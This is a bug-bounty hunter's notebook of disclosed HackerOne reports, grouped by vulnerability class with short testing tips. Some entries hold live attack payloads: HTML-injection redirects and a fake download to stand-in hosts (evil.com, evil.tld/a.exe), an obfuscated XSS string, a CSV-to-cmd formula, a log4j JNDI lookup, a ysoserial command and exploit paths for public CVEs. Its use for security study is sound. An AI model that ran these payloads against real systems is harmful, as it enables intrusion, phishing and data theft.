# H1 Report Notes - Shreyas Chavhan's field notes from reading 5,000 HackerOne reports

Source: https://shreyaschavhan.notion.site/H1-Report-Notes-Shreyas-Chavhan-Shared-105a53e43119812a9861cca325a646dd
(shared publicly by the author; also links https://github.com/shreyaschavhan/10000-h1-disclosed-reports)

## How to use

Each category below lists the specific reports the author found worth remembering, with the takeaway lesson in the title. Grep for the bug class you are hunting, read the linked report on HackerOne before writing a similar finding, and steal the tested patterns.


## 2FA Verification Bypass

```
Authentication Bypass by bruteforcing authentication pin | 2FA | https://hackerone.com/reports/2245437
```

## AWS S3 Bucket Takeover

```
AWS Bucket Takeover to Stored XSS:
https://hackerone.com/reports/2262939 
https://hackerone.com/reports/1598347
Other:
https://hackerone.com/reports/1835133
https://hackerone.com/reports/1791558
https://hackerone.com/reports/1397826
https://hackerone.com/reports/1777077
```

## Account Take Over

```
Account TakeOver coz password reset page leak temp password in password reset request | password reset | https://hackerone.com/reports/2194928
Account takeover because of stored open redirect in saml sign in via google/ or other and csrf  | oauth | saml | sso | https://hackerone.com/reports/1923672 | - check if any open redirect on login vai google, microsoft etc
Account takeover because of improper time stamp validation of jwt signature | jwt | https://hackerone.com/reports/1760403 | always try setting jwt time stamp to past
IDOR to account takeover via idor at OTP feature which gave attacker direct access to session token | otp | https://hackerone.com/reports/921780
Account Takeover by stealing SSO tokens chaining multiple issues | sso | https://hackerone.com/reports/265943
Full account takeover by creating account in subdomain via victim email and using that account cookie in main domain | cookie | subdomains | https://hackerone.com/reports/1078479 | check if you can use subdomain cookies in main domain if the subdomain and main domain are different and allow registration differently
Using 2 open redirects to steal access token via referer header | https://hackerone.com/reports/835437 | always check how you’ll be able to leverage a non-impactful vuln to create an impact
Stealing oauth token using open redirect using idn homograph attack at redirect_uri | oauth | https://hackerone.com/reports/861940 | semrush.com ≠ sémrush.com
```

## Amazon Cognito Misconfigurations

```
Case 1:
Check if there’s any new custom: value while registering
Check if we can replace the custom value with already existing one to gain access to the already exisiting account
Reference: https://medium.com/@_deshine_/account-take-over-due-to-aws-cognito-misconfiguration-7b092c667ee3
```

## Authentication Issues - Generic

```
H1 Reports
Key Takeaways
Authentication Issues
Access features using Disabled accounts via JWT
JWT
https://hackerone.com/reports/2213251
Always try replacing JWT metadata of a banned user with JWT metadata of low privileged user
Create multiple captians to avail free bonus
graphql
https://hackerone.com/reports/2067247
Missing access control check allows member to perform admin task
app feature
https://hackerone.com/reports/1486310
Removed user still have read/write access to workspace via different endpoints
app feature
https://hackerone.com/reports/1479894
https://hackerone.com/reports/1473071
user with no permission can access restricted data
app feature
https://hackerone.com/reports/1499114
Download even when allow download is disabled
app feature
https://hackerone.com/reports/1745766
Admin account still has access to admin features after being removed from the organization if he’s invited for 2 differnet roles
member invitation
https://hackerone.com/reports/1596663
Add an admin to your organization 
accept invitation
Add same user as other role
accept invitation
now change permission of that invited user to none
note that the user has been removed but he still can perform actions
```

## Bruteforce attacks

```
Authentication Bypass by bruteforcing authentication pin
2FA
https://hackerone.com/reports/2245437
```

## Buffer Overflow

```
https://hackerone.com/reports/1340942
```

## Bypass Restrictions

```
Key Takeaways
Bypass Ban Restrictions using API Keys
https://hackerone.com/reports/2081930
Check if banned user can make use of API keys to bypass the ban
Bypass bruteforce protection by converting POST to GET
https://hackerone.com/reports/2094473
if POST parameter is rate limited, try sending the request via GET method
Bypass 403 using upper case endpoint
https://hackerone.com/reports/2078527
If /metrics/ gives 403, try /METRICS/
Bypass image download restrictions via image preview
https://hackerone.com/reports/1965156
Try bypassing image restrictions via preview features
Unverified user can post newsletters
https://hackerone.com/reports/1691603
Check what restrictions unverified users have vs verified ones and try to check verfied ones 
Banned user can ibe invited as a collaborator
https://hackerone.com/reports/1959219
Bypass moderator approval by changing status from moderator to approved/active
https://hackerone.com/reports/1861487
always try chaining select based parameters
Create workspace for new users when the creation of it is disallowed
https://hackerone.com/reports/1758174
always try replaying requests from one domain to another similar domain
Bypass invite accept for victim
https://hackerone.com/reports/1663361
always check if you can add the user to your organization without their consent
Bypass download file restrictions by resharer
https://hackerone.com/reports/1724016
whenever you are sharing file with people, if you have access to reshare feature - check if you can modify view to download or write
Perform restriction actions - change names and information after official id verification
https://hackerone.com/reports/1446107
check what restrictions are in place first and then perform actions that are against them
Bypass malicious link tweets restrictions using two open redirects and ideographic fullstop
https://hackerone.com/reports/1032610
always check if you can bypass restrictions using ideographic full stop by url encoding it
Download file with arbitrary extension coz “ is not restricted
https://hackerone.com/reports/1215263
file.bat”.png resulted in file.bat when downloading
Having the id empty leaks everything
https://hackerone.com/reports/1044285
Bypass extension check to stored XSS using `Content-type: text/html; image/png`
https://hackerone.com/reports/1019425
while file uploading, try using multiple content types `text/html; image/png`
Access premium features by changing occurence of false to true in response
https://hackerone.com/reports/1070510
always check modifying false to true in response using burp match and replace
```

## CORS misconfig

```
https://hackerone.com/reports/1199527
https://hackerone.com/reports/1183601
```

## CRLF Injection

```
Impact
Payload
Chains
OAuth redirect_uri
HTTP Header Injection
https://hackerone.com/reports/2147132
%0d%0axxx:something
GET input parameter
XSS
https://hackerone.com/reports/2189960
CRLF
XSS
hack_redirect_now
XSS and Open Redirect
https://hackerone.com/reports/2012519
CRLF
XSS
Open Redirect
CRLF injection at homepage
HTML injection
https://hackerone.com/reports/1943013
Creating familiar looking urls to deceive user to click on attacker controlled link using newline character
https://hackerone.com/reports/712979
fakewebsite.tw + %0d + itter.com
SMTP injection to email a cc to us using newline
https://hackerone.com/reports/1509216
https://hackerone.com/reports/1516377
https://hackerone.com/reports/347439
```

## CSRF

```
Request Method
H1 Reports
Takeaways
Chains
CSRF because there ain’t any CSRF Token
GET
POST
https://hackerone.com/reports/2041007
if sameSite value of the cookies are lax or none , attacker can create a website to perform CSRF.
CSRF to Reflected XSS
POST
https://hackerone.com/reports/2050122
https://digi.ninja/blog/xss_through_csrf.php
https://hackerone.com/reports/1096123
If a post based parameter is vulnerable to reflected XSS but you don’t know how to exploit it, check if you can perform CSRF, if you can you’ll be able to get XSS.
XSS
CSRF to change profile picture
POST
https://hackerone.com/reports/2144870
profile picture
CSRF to ip leak on password reset
POST
https://hackerone.com/reports/2106662
If an attacker sends password reset link to his email using CSRF, victims ip address might be leaked
password reset
CSRF to make anyone follow us by clicking on the link
GET
https://hackerone.com/reports/1961163
https://hackerone.com/reports/1964211
follow feature
invite feature
CSRF to delete users’ added PII
GET
https://hackerone.com/reports/709537
https://hackerone.com/reports/2029753
Always check for unprotected CSRF endponits
delete feature
CSRF to enable/disable delegation
POST
https://hackerone.com/reports/2002352
CSRF at 3rd party integrations allows attacker to link victims github/other integrations on their own account
GET
https://hackerone.com/reports/1727221
3rd party integration feature
CSRF at file import
POST
https://hackerone.com/reports/1637761
CSRF via get param
GET
https://hackerone.com/reports/1477050
Graphql get request CSRF
GET
https://hackerone.com/reports/1122408
try checking if you can make get request via graphql
CSRF token not tied to user’s session and allows CSRF attacks
https://hackerone.com/reports/1086134
always check the csrf token with other user account
General Takeaways:
if sameSite value of the cookies are lax or none , attacker can create a website to perform CSRF.
If a website uses Same-Site=Strict for their cookies and has an unexploitable GET-based CSRF, it is possible to trigger that CSRF via a client-side open/closed redirect since the request will be coming from the Same-Site Always keep note of those endpoints.
GET  based CSRF can slip through from dev’s eyes - you have to check if any get requests are causing state change.
```

## CSV Injection

```
payload
CSV Injection to Command Injection
member invitation
https://hackerone.com/reports/1748961
=cmd|' /C notepad'!'A1’
CsV Injection
csv export
https://hackerone.com/reports/1131887
;=1+1;
Formula injection in CSV
csv export
https://hackerone.com/reports/928280
=1+1
General Takeaway:
If the program has permission to export csv files, try to check if you can control the input - if yes, check for CSV injection
```

## CVEs

```
CVE Numbers
CVE Name
H1 Reports
Payload
CVE List
CVE-2023-40611
Apache Airflow Dag Runs BAC
https://hackerone.com/reports/2144868
CVE-2020-14179
Information Disclosure vulnerability in the /secure/QueryComponent!Default.jspa endpoint
https://hackerone.com/reports/2122964
/secure/QueryComponent!Default.jspa 
CVE-2020-3452
Unauthenticated file read
https://hackerone.com/reports/2233418
/+CSCOT+/oem-customization?app=AnyConnect&type=oem&platform=..&resource-type=..&name=%2bCSCOE%2b/portal_inc.lua
CVE-2023-3580
XSS
https://hackerone.com/reports/2233421
/+CSCOE+/saml/sp/acs?tgname=a
CVE-2023-26360
Unauthenticated Arbitrary File read
https://hackerone.com/reports/2248781
/cf_scripts/scripts/ajax/ckeditor/plugins/filemanager/iedit.cfc?method=wizardHash&_cfclient=true&returnFormat=wddx&inPassword=foo
CVE-2021-26084
RCE
https://hackerone.com/reports/1327701
https://hackerone.com/reports/1327769
/pages/createpage-entervariables.action?SpaceKey=x

/confluence/pages/doenterpagevariables.action
CVE-2020-14179
Information Disclosure in Jira
https://hackerone.com/reports/2126039
/rest/menu/latest/admin?maxResults=1000
CVE-2023-29489
XSS in cpanel
https://hackerone.com/reports/1982630
/cpanelwebcall/%3Cimg%20src=x%20onerror=%22prompt(1)%22%3Eaaaaaaaaaaaa
CVE-2022-44268
Arbitrary Remote Leak via ImageMagick
https://hackerone.com/reports/1858574
CVE-2018-1000129
Jolkia Reflected XSS
https://hackerone.com/reports/1714563
```

## Cache Deception

```
Impact
Cache deception table
Cache Deception to account takeover and stored xss
search destination feature
profile page
view source
https://hackerone.com/reports/1698316
Always check page source if it’s leaking any session cookie - if yes, check for cache deception by adding test.jpg png etc at the end and open that file into the incognito tab
Account Takeover
Stored XSS
Cache deception to PII leakage
main page
https://hackerone.com/reports/1530066
https://hackerone.com/reports/631589
Cache deception to CSRF token disclosure
https://hackerone.com/reports/1343086
Cache deception to CSRF and pii disclosure
https://hackerone.com/reports/1271944
/random.css
```

## Cache Poisoning

```
Impact
Cache Poisoning allows redirection on JS files
Js File
1. Send a get request /test.js?cb=1with X-forwarded-scheme: http and X-forwarded-host: example.com - if it gets redirected - check if it can be cached.  
https://hackerone.com/reports/1795197
Stored XSS
Cache poisoning via x-forwarded-host to DoS
main webpage
https://hackerone.com/reports/1976449
DoS
Cache poisoning to reflected html/css injection
try making use of a custom header and check if there’s any reflection
https://hackerone.com/reports/1888351
Stored HTML CSS Injection
Cache poisoning via reflected cookie causes stored XSS to account takeover
cookie
always check if double quotes bypass xss waf
https://hackerone.com/reports/1760213
Stored XSS
Account takeover
Cache poisoning to stored XSS and DoS
cookie-based-xss
/../
https://hackerone.com/reports/1621540
Cache poisoning to stored XSS and csrf token exposure
Js File
cookie
x-forwarded-for: xss
cookie: param=xss</script%20
https://hackerone.com/reports/1424094
Cache poisoning to DoS
authorization header
authorization header gave 403 and that 403 was being cached
https://hackerone.com/reports/1173153
Cache poisoning to DoS using x-forwarded-scheme on static files
static files
x-forwarded-scheme
https://hackerone.com/reports/1181946
Cache poisoning to DoS using x-http-method-override
static files
x-http-method-override
https://hackerone.com/reports/1160407
Cache poisoning to DoS using trailer: 1
static files
trailer: 1
https://hackerone.com/reports/1219038
Cache poisoning to DoS using corrupt image file upload
file upload
https://hackerone.com/reports/996041
Cache poisoning to dos using host header with closed port
host
https://hackerone.com/reports/1346618
https://hackerone.com/reports/1096609
```

## DOS

```
Long email address causes DoS
share via email
email invitation
https://hackerone.com/reports/2058337
DoS on web3 method via evm_rest
evm json rpc
https://hackerone.com/reports/324021
DoS victim organization by adding space at the end of the victim id
https://hackerone.com/reports/976603
```

## Default / No Credentials

```
Credentials
H1 Reports
Path
LoadRunner Enterprise Site Management Panel
admin:admin
https://hackerone.com/reports/2128863
/site
Unauthenticated Access to Celery Flower Instance
https://hackerone.com/reports/2264960
/pim/flower/
RCE via Pentaho Business Server Dashboard bcz of default credentials
admin:password
https://hackerone.com/reports/1677047
www.example.com:8888/pentaho
Tomcat manager exposed
tomcat:tomcat
https://hackerone.com/reports/1267174
```

## Email Misconfigurations

```
Create miscellaneous support ticket on anyone’s account through support@example.com email
Support Tickets
https://hackerone.com/reports/2001913
https://infosecwriteups.com/mail-server-misconfiguration-leads-to-sending-a-fax-from-anyones-account-on-hellofax-dropbox-bbp-aab3d97ab4e7
Delete any user account by using spoofed email
https://hackerone.com/reports/928255
https://hx01.me/Abusing_Data_Protection_Laws_For_D0xing_and_Account_Takeovers.pdf
```

## HTML CSS Injection

```
Payload
HTML Injection
HTML Injection in Contact Creation Field
<meta http-equiv="refresh" content="2; https://evil.com/" />
https://hackerone.com/reports/2210038
app features
HTML Injection in one field leads to payload execution on a completely different page
https://hackerone.com/reports/2076019
page name
Stored HTML Injection from non-admin to admin user in edit comment feature
</base</sTyle/</scRIpt/</textArea/</noScript/</tiTle/-->＜h1/<h1><image/onerror="import('data:application/javascript;charset=utf-8;base64,YWxlcnQoZG9jdW1lbnQuZG9tYWluKTtjb25zb2xlLmxvZyhkb2N1bWVudC5kb21haW4pOy8v')//%27"src><script>
https://hackerone.com/reports/2111291
edit comment
HTML Injection in search field
<meta http-equiv="refresh" content="1; http://attacker.com"></meta>
https://hackerone.com/reports/2018615
Email html injection
https://hackerone.com/reports/1374017
Reflected HTML injection via flowid parameter
%22%3E%3Ch1%3EYour+machine+needs+to+be+analyzed.+Please+download+and+run+this+file+to+continue%3a+%3Ca+href%3d%22http%3a//evil.tld/a.exe%22%3EClick%20here%20to%20Download%3C/a%3E%3C/h1%3E%3C!--
https://hackerone.com/reports/1880896
HTML Injection via chrome extention on main website
https://hackerone.com/reports/1874260
HTML INjection in invoice feature
https://hackerone.com/reports/1257767
Persistent CSS injection in markdown parser due to loose restrictions
https://hackerone.com/reports/1401268
HTML CSS injection to account takeover
https://hackerone.com/reports/1533976
html injection in email field
"<style>.flex-line-item-quantity>p{font-size:0}.flex-line-item-quantity:after{content:'1337\0000a0of\0000a01337';margin-left:420px;}</style>"@gmail.com
https://hackerone.com/reports/1087122
```

## HTTP Request Smuggling

```
HTTP Request Smuggling (CL.0) to mass redirect users to attacker server
cdn
https://hackerone.com/reports/1943608
HTTP Request sumggling due to incorrect parsing of multi-line transfer-encoding
https://hackerone.com/reports/1665156
https://hackerone.com/reports/1063627
Read later:
https://hackerone.com/reports/1238709
https://hackerone.com/reports/1063627
https://hackerone.com/reports/955170 - Request smuggling to XSS
https://hackerone.com/reports/867952
https://hackerone.com/reports/771666 - Request smuggling to ATO
https://hackerone.com/reports/726773
```

## IDOR

```
Enable birthday contact of any user
Enable
https://hackerone.com/reports/2112973
user settings
Delete other user’s content by creating a new resource with that ID on your acccount
Create
https://hackerone.com/reports/2212627
app feature
Try creating a new resource with the same ID with another resource
Delete reports in team without access to it
Delete
https://hackerone.com/reports/2203432
team member
Try deleting sources of team that you have no access to
Block user 2FA access using ID in the cookie
https://hackerone.com/reports/1179232
2fa
login
Try to check if you can block a user from entering 2fa code 
Delete Profile images using userId
Delete
https://hackerone.com/reports/2213900
profile picture
IDOR in unrealeased feature
GraphQL Mutation
https://hackerone.com/reports/2218334
js files
Monitor JS files for code changes
IDOR to deny a feature from another user / admin
Disable
https://hackerone.com/reports/2081744
app feature
IDOR to lock any report on H1
Disable
Lock
https://hackerone.com/reports/2139190
app feature
This guy kept reporting issues to H1, he has reported 22 issues and 6 has accepted only - stick to one program and you’ll find bugs.
IDOR to delete any twitter user’s list cover photo
Delete
https://hackerone.com/reports/1437004
cover photo
create a banner photo with victim’s media id, delete your photo and his photo will get deleted
IDOR to send message on behalf of other user
websocket
https://hackerone.com/reports/1888545
message feature
Always test websocket messages
IDOR to view bounty amount even if the feature is disabled by the user
View
https://hackerone.com/reports/2101087
app feature
always note down what’s supposed to be public and what not
IDOR to upload videos
Create
Upload
https://hackerone.com/reports/2085185
upload videos
IDOR to delete license of other users
Delete
https://hackerone.com/reports/2122671
user settings
IDOR to delete invitation
Delete
https://hackerone.com/reports/1947924
invite feature
IDOR to delete anyone’s featured photo
Delete
https://hackerone.com/reports/1608735
app feature
cover photo
IDOR to report drafts leaking draft details
Report
https://hackerone.com/reports/1675674
https://hackerone.com/reports/1581528
report
IDOR in channel ID leads to customer email disclosure
View
https://hackerone.com/reports/2083270
app feature
IDOR to delete file system
Delete
https://hackerone.com/reports/2047168
app feature
IDOR to make user accept a bid
Update
Create
https://hackerone.com/reports/1960107
app feature
IDOR to create epic in victim account
Create
https://hackerone.com/reports/1892200
app feature
IDOR to create, update & delete notes
Create
Delete
Update
https://hackerone.com/reports/1751258
app feature
IDOR to delete any linkedin comment on learning api
Delete
https://hackerone.com/reports/1801527
comment feature
urn id
IDOR to view links which was accessible to only paid users
View
https://hackerone.com/reports/1813450
app feature
IDOR to upin posts from companies we are not part of
Disable
https://hackerone.com/reports/1862677
pin/unpin feature
IDOR to delete campain
Delete
https://hackerone.com/reports/1969141
app feature
IDOR to read cards unauthenticated
View
https://hackerone.com/reports/1331728
app feature
IDOR to view subscribers of others newsletter
View
https://hackerone.com/reports/1716300
app feature
IDOR to delete message of another user
Delete
https://hackerone.com/reports/697412
message feature
IDOR to lead user details
View
https://hackerone.com/reports/1848176
user settings
IDOR to delete linkedin users/companies post
Delete
https://hackerone.com/reports/337755
post feature
IDOR to read any email
View
https://hackerone.com/reports/1784681
app feature
IDOR to rotate user api token
Update
https://hackerone.com/reports/1525309
api token
IDOR - Admin user can send invites on behalf of other admin users
Create
https://hackerone.com/reports/1474536
invite feature
IDOR - view thumbnails of any private videos
View
https://hackerone.com/reports/1498353
upload videos
IDOR to view private repositories of other users
View
https://hackerone.com/reports/1692788
github integration
IDOR to change privacy settings of other users
Update
https://hackerone.com/reports/1733627
privacy setttings
IDOR - any user can vote on friend only video poll
Vote
https://hackerone.com/reports/1793940
upvote/downvote feature
IDOR to delete other users files
Delete
https://hackerone.com/reports/1755555
js files
IDOR to view account balance
View
https://hackerone.com/reports/1587374
IDOR to view stats
View
https://hackerone.com/reports/1644436
stats feature
IDOR to resume leak
View
https://hackerone.com/reports/1777095
file id
IDOR to fetch all chats from a given room via room_id
View
https://hackerone.com/reports/1410246
chat feature
IDOR to modify link of any user
Update
https://hackerone.com/reports/1661113
user settings
IDOR to delete technical skill assessment result
Delete
https://hackerone.com/reports/1592587
user settings
app feature
IDOR to access any support ticket
View
https://hackerone.com/reports/1124974
support
IDOR to exfiltrate a victim’s exact location on bumble app
View
https://hackerone.com/reports/1234406
https://blog.includesecurity.com/2014/02/how-i-was-able-to-track-the-location-of-any-tinder-user/
Restricted user can remove 
Delete
https://hackerone.com/reports/766145
content-type: application/graphql
IDOR to purchase membership using another users wallet using wallet id
Create
https://hackerone.com/reports/938021
payment
```

## Information Disclosure Misc

```
H1 Reports
Google Docs Link Leaked in JS File
https://hackerone.com/reports/2180521
JS File
User Details of Hibernated account can be viewed using Link Preview
https://hackerone.com/reports/1728087
Link Preview
Hacker Email Disclosed
https://hackerone.com/reports/2215434
https://hackerone.com/reports/2134874
H1 Hacktivity
Search for private words in limited disclosed H1 reports
https://hackerone.com/reports/2213251
search
Deleted Feature were still accessible via another endpoint
https://hackerone.com/reports/2212555
rss endpoint
Private file preview stays public and we can’t delete it
https://hackerone.com/reports/1984060
file preview
Django Debug Panel Exposed to leak sensitive information
https://hackerone.com/reports/2078707
subdomain
Unsubscribed user could read tweets that required subscription
https://hackerone.com/reports/2063636
Link Preview
Credentials leaked because PhpDebugBar was on
https://hackerone.com/reports/1883806
CSV export leaks information that should be otherwise private
https://hackerone.com/reports/2011431
CSV export
User email disclosure in graphql query
https://hackerone.com/reports/2032716
grpahql
collaborator feature
PoC video on disclosed report leaks private program and undisclosed reports
https://hackerone.com/reports/1869613
h1 disclosed reports
View anyone’s email by inviting them as collaborator
https://hackerone.com/reports/1918362
collaborator feature
Information Disclosure via export feature
https://hackerone.com/reports/1664920
https://hackerone.com/reports/1172852
Export feature
Emails disclosure via expanding urn injection
https://hackerone.com/reports/1806939
urn fields
Disclose who’s in a group without being in the group
https://hackerone.com/reports/1850407
group feature
Deleted polls are still accessbile
https://hackerone.com/reports/1015373
app feature
Expired content can still be seen after expiry
https://hackerone.com/reports/1784310
expire feature
new feature leaks information about private functionality
https://hackerone.com/reports/1868473
Information disclosure via graphql search end points aggregate function
https://hackerone.com/reports/1838329
graphql aggregate
search
Private app disclosure which user should not have access to
https://hackerone.com/reports/1085332
graphql
User with expired passwords can still access the full api using tokens
https://hackerone.com/reports/1285226
graphql
Information disclosure by removing check_out token or id empty
https://hackerone.com/reports/1044285
General Takeaways:
Check JS files for Google Doc Links
Check if you can disclose a hibernated/banned user using link preview
Check if you could search for private keywords via search functionality
Check file previews and see if they can be deleted, if not - it can be a vulnerability
Always check application/endpoints behavior againt this:
​
Try changing 302 Redirect or 403 or 401 to 200 OK to see if we can get information disclosure
```

## LFI - Local File Inclusion

```
[CVE-2022-44268] LFI because of vulnerable ImageMagick: Critical:  https://hackerone.com/reports/1858574
Arbitrary file read via double encode url: https://hackerone.com/reports/232371
Arbitrary file read in desktop app: https://hackerone.com/reports/943737 |  Payload - window.open('file://c:/windows/system32/drivers/etc/hosts').eval('alert(document.body.innerText);');
Arbitrary file read during project import: https://hackerone.com/reports/1132378 
Grafana 8.x LFI: https://hackerone.com/reports/1419213
```

## Leaked API Keys / Secrets / Tokens

```
Location of Leak
OAuth2 Client Secret
Github
https://hackerone.com/reports/1994324
Mastodon Staging Instance Admin API Key
Slack
https://hackerone.com/reports/2137154
Jira panel api token leaked in github
Github
https://hackerone.com/reports/1785145
Facebook app api credentials leak
exe file
https://hackerone.com/reports/1641475
Github token leaked in electron app made by shopify
electron app
https://hackerone.com/reports/1087489
Firebase config leaked with impact
https://hackerone.com/reports/1065134
```

## OS Command Injection

```
Blind Out of Band Command Injection via email field: https://hackerone.com/reports/410334
Payload
​
```

## Other low hanging fruits

```
Github repository linked to unowned asset i.e. the asset ownership has expired: https://hackerone.com/reports/2011298
QR scanner app redirect users without asking if they want to visit the link, can allow attacker to let victim download a malware against their will: https://hackerone.com/reports/1946534
Unauthenticated cache purge: https://sapt.medium.com/apple-hall-of-fame-for-a-small-misconfiguration-unauth-cache-purging-faf81b19419b
Password reset links are send via insecure http protocol: https://hackerone.com/reports/1888915
If the app doesn’t allow a feature - for example: api token creation for unverfied email users, verify the email and create that feature and then change your email id and don’t verify it and check if you can access that feature: 
Cloudflare Public Bug Bounty disclosed on HackerOne: Bypassing...
Cloudflare restricts the creation of API Tokens to email-verified accounts, however, if an email-verified account changed their account's email address without verifying the new email, previously...
https://hackerone.com/reports/1812705
User session stays valid after acount deletion: https://hackerone.com/reports/1728292
Origin ip allows anyone to use the application as authenticated user: https://hackerone.com/reports/736391
Use of deep links in android/ios apps allows oauth token stealing: https://hackerone.com/reports/1700734
https://hackerone.com/reports/1667998
Object injection by sending "email":{"email":1} while user registration : https://hackerone.com/reports/1183335
Render image into svg (can also render pdf): https://hackerone.com/reports/1261413 
Lock your wallet in one tab and it should be locked in other two: https://hackerone.com/reports/1792544
Disconnecting an external login provider does not revoke user session: https://hackerone.com/reports/1547684
Open redirect in oauth + css injection to Personal data exfiltration: https://hackerone.com/reports/1245165
Post based open redirect + csrf = https://hackerone.com/reports/1257753
Get free delivery to your address by signing up with @company.com emails. : https://hackerone.com/reports/1296584
OPen redirect using homograph attack: https://hackerone.com/reports/1285245
Company github repo uses another github repository for base action, that github user change it’s username - that username become available for takeover, attacker takes it over: https://hackerone.com/reports/1439355
`[PoC](&#65534;(&#41;).` causes DoS in markdown renderer: https://hackerone.com/reports/1176794
Upload an image with gps metadata: https://hackerone.com/reports/1069039 
Change your email to something else and don’t verify it, then change it to something else again and check if previous link is still valid and gives you access to the account: https://hackerone.com/reports/1114347
Pixel flood attack: https://hackerone.com/reports/970760
EXIF metadata in uploaded photos: https://hackerone.com/reports/446238
File upload to XSS by uploading html: https://hackerone.com/reports/900179
Redirect Spoofing using RTLO: 
https://hackerone.com/reports/563268
https://hackerone.com/reports/299403
```

## Path Traversal

```
H1 Reports
Path Traversal to PII Disclosure
checkout
https://hackerone.com/reports/1575014
Path traversal  
api
https://hackerone.com/reports/2032778
Path traversal because /../ is checked but \..\ is not and \ is replaced by /
https://hackerone.com/reports/1765631
Path traversal using ../../../../../../../../etc/hosts
file download
https://hackerone.com/reports/1888808
Path traversal in oauth redirect_uri can leak authorization code and oauth credential and cause ATO
oauth
https://hackerone.com/reports/1861974
Ngnix off by slash to path traversal and git config disclosure
ngnix
https://hackerone.com/reports/1386547
Path traversal to remote github file inclusion to xss
https://hackerone.com/reports/895972
Path traversal combined with file upload to Code Execution
https://hackerone.com/reports/727727
```

## Paywall bypass

```
Payless than the price by changing order id to an id with less price keeping the output same: https://hackerone.com/reports/1213765
Race Condition on transaction id at verify purchase endpoint to get more items for the price: https://hackerone.com/reports/801743
Modify in-flight data due to misconfiguration in hash generation logic: https://hackerone.com/reports/1295844
Buy at reduced price by chaging price using match and replace rule: https://hackerone.com/reports/783688
```

## Privilege Escalation

```
TakeAway
Privilege Escalation from lowest privilege to the highest
member settings
https://hackerone.com/reports/2188569
- Invite a user
- from the invited user, replay the request to modify our privilege
Privilege Escalation from low privilege to high
member invitation
https://hackerone.com/reports/2281075
Takeaways:
 
• 1 organization
• Several roles - privileges
     from low to high
• Several functionalities -
     each functionality have their own privileges
 
Steps to
reproduce:
 
• Create a organization
• Invite an user as the lowest privilege
• Create a feature and add this low privilege user to that functionality/feature as someone with access to member invitation to that feature.
• Join the organization with  that low privilege account
• Go to that feature &  intercept the request to add someone as a user.
• Change the roles to the highest roles and invite yourself
• Check if your privileges were escalated
Permission Escalation from read only to full access for a shared file
share file
https://hackerone.com/reports/1990443
always check if you can escalate your permission to view a file to read and write
Privilege escalation by editing your role to “roles:[admin]”
group feature
https://hackerone.com/reports/917946
Privilege escalation even after being demoted
member invitation
https://hackerone.com/reports/1656380
- Invite a member with higher privilege
- accept the invitation and keep note of the request
- demote the user role
- now replay the request user to accept previous invitation
```

## RCE

```
RCE via File Upload with Null Byte Truncated File Extention
File Upload
Always check file uploads with null bytes for example: /filename.php[nullbyte].png
https://hackerone.com/reports/2054184
RCE using cookie deserialization
Cookie
Try command injection in serialized cookies
https://hackerone.com/reports/2248328
RCE via file upload
File Upload
Pentaho dashboard access with default credentials
https://hackerone.com/reports/1677047
Code Injection in npm app via reflected parameter in the dom
video generation
export feature
always check if we can execute require and exec function in javascript app
https://hackerone.com/reports/1636382
Prototype Pollution to RCE
https://hackerone.com/reports/1631258
Grafana RCE via SMTP server parameter injection
grafana
https://hackerone.com/reports/1200647
JdbcSinkConnector HTTPSinkConnector RCE by leveraging file upload via SQLite JDBC driver and SSRF in internal Jolokia
https://hackerone.com/reports/1547877
RCE on apache flink server
https://hackerone.com/reports/1418891
RCE via zip file uplaod
File Upload
https://hackerone.com/reports/1122791
log4j rce
${jdni:ldap://nps.acronis.com.<your-server>/test}
https://hackerone.com/reports/1425474
https://hackerone.com/reports/1442644
Remote Code Execution via .NET VSTATE Deserialization
.NET vstate
ysoserial.exe -g TypeConfuseDelegate -f LosFormatter -c "ping <yourserver>.interactsh.com" -o raw | base64 -d | gzip - | base64 -w0
https://hackerone.com/reports/1391576
RCE via file upload using path traversal
File Upload
path traversal
https://hackerone.com/reports/1377748
Dependancy confusion to RCE
npm
https://hackerone.com/reports/1104693
https://hackerone.com/reports/1043385
Exposed kubernetes API to RCE
exposed api
https://hackerone.com/reports/455645
Command Injection via $(command)
/command feature
https://hackerone.com/reports/851807
https://hackerone.com/reports/852613
```

## Race Condition

```
Race Condition to Upvote multiple times
upvote/downvote
https://hackerone.com/reports/183837
Race Condition to apply coupon code more than limit
coupon code
https://hackerone.com/reports/1717650
Race Condition to avail discount multiple times
coupon code
https://hackerone.com/reports/1849626
Race Condition to join the same group more than once
group
https://hackerone.com/reports/1540969
Race Condition to inflate likes of user comments
comment like
https://hackerone.com/reports/1409913
Race condition in user invite to invite unlimited users
member invitation
https://hackerone.com/reports/1460373
Race condition to bypass original seat limit
member invitation
https://hackerone.com/reports/1418419
Race condition to send multiple feedbacks
feedback
https://hackerone.com/reports/1132171
Race condition to get more free trails
free trails
https://hackerone.com/reports/1087188
Race condition to bypass vote limit by using x-forwarded-for: <ip>
upvote/downvote
https://hackerone.com/reports/812907
Turbo intruder for race condition check: https://hackerone.com/reports/1285538
```

## Read Again Later and try to understand

```
https://hackerone.com/reports/302581 : Full Account takeover - Critical 9.8
https://hackerone.com/reports/1632973 
https://labs.detectify.com/ethical-hacking/middleware-middleware-everywhere-and-lots-of-misconfigurations-to-fix/
https://hackerone.com/reports/1901040 : Creating fake SSH certificate to bypass Authentication
https://hackerone.com/reports/1672388
https://hackerone.com/reports/1679624
https://hackerone.com/reports/1609965
https://hackerone.com/reports/1567186 - account takeover by fransrosen on reddit
https://hackerone.com/reports/1262434
https://hackerone.com/reports/1575912
https://hackerone.com/reports/1478633
https://hackerone.com/reports/1401444
https://hackerone.com/reports/1458236
https://hackerone.com/reports/1439593
https://hackerone.com/reports/1341957
https://hackerone.com/reports/1226891 - DNS hijacking to domain takeover
https://hackerone.com/reports/1130874 - No SQL injection
https://hackerone.com/reports/1218708 - h1-ctf
https://hackerone.com/reports/1217114 - ht-ctf
https://hackerone.com/reports/1106238 - prototype pollution to stored xss
https://hackerone.com/reports/1104120
https://hackerone.com/reports/1104111 - RCE via sqli
https://hackerone.com/reports/976603
https://hackerone.com/reports/1125425
https://hackerone.com/reports/1154542
https://hackerone.com/reports/900619 - Postmessage xss
https://hackerone.com/reports/1082847
https://hackerone.com/reports/530974 - SSRF interesting
https://security.lauritz-holtmann.de/advisories/tiktok-account-takeover/
https://hackerone.com/reports/999765
https://medium.com/intigriti/how-i-hacked-hundreds-of-companies-through-their-helpdesk-b7680ddc2d4c
https://hackerone.com/reports/783877
https://hackerone.com/reports/771666 - HTTP Request smuggling to Account Takeover
https://hackerone.com/reports/850447
Read all disclosed reports by: https://hackerone.com/vakzz
https://hackerone.com/reports/129873
